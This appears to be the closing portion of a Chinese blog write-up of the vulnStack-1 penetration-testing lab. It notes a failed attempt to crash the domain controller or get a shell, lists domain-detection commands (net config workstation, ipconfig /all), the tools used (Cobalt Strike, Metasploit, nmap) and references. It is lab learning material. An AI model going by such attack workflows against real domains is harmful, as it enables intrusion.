+<p>报错，并没有把域控打蓝屏，也没有拿到shell。</p>
+<p>根据报错，搜了下并没有解决问题，后面打开的时候莫名奇妙域环境中端口也不通了。暂时先了解下流程，后面多学点再来试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425223010635.png" alt="image-20230425223010635"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425223036044.png" alt="image-20230425223036044"></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1，如何判断是否存在域环境</p>
+<ul>
+<li>net config Workstation ：查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</li>
+<li>ipconfig /all ：查看 DNS 服务器，发现主 DNS 后缀不为空，存在域<code>god.org</code></li>
+</ul>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
+<li>计网知识掌握太少，对于一些操作为什么要去这样做不是很理解</li>
+<li>域相关知识不了解</li>
+</ul>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://jwt1399.top/posts/24047.html#toc-heading-2">CS</a></li>
+<li>MSF</li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/php09/p/10530057.html">nmap</a></li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/11835388">https://blog.csdn.net/weixin_39190897/article/details/11835388</a></li>
+<li><a target="_blank" rel="noopener" href="https://jwt1399.top/posts/24047.html">https://jwt1399.top/posts/24047.html</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnStack-1"><span class="toc-number">1.</span> <span class="toc-text">vulnStack-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">靶场搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.</span> <span class="toc-text">遇到的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">外网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.3.1.</span> <span class="toc-text">cs上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">内网横向渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.5.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.8.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&text=渗透取经-vulStack1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&is_video=false&description=渗透取经-vulStack1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透取经-vulStack1&body=Check out this article: http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&title=渗透取经-vulStack1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&name=渗透取经-vulStack1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/&t=渗透取经-vulStack1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
